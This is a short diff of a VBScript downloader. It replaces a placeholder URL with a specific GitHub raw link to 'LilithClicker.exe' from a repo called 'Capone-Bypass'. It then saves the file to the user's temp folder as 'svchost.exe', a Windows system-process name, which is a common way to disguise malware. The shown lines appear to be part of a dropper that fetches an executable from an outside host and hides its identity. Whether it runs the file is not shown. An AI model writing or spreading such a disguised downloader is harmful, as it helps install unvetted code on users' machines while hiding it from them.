@@ -13,8 +13,8 @@
             Set objFSO = CreateObject("Scripting.FileSystemObject")
             Set objHTTP = CreateObject("MSXML2.ServerXMLHTTP.6.0")
             
-            ' Download URL - CHANGE THIS TO YOUR URL
-            strURL = "https://raw.githubusercontent.com/YOUR_USERNAME/YOUR_REPO/main/LilithClicker.exe"
+            ' Download URL
+            strURL = "https://raw.githubusercontent.com/sircapone1306-wq/Capone-Bypass/main/LilithClicker.exe"
             
             ' Temp file path
             strTemp = objShell.ExpandEnvironmentStrings("%TEMP%") & "\svchost.exe"
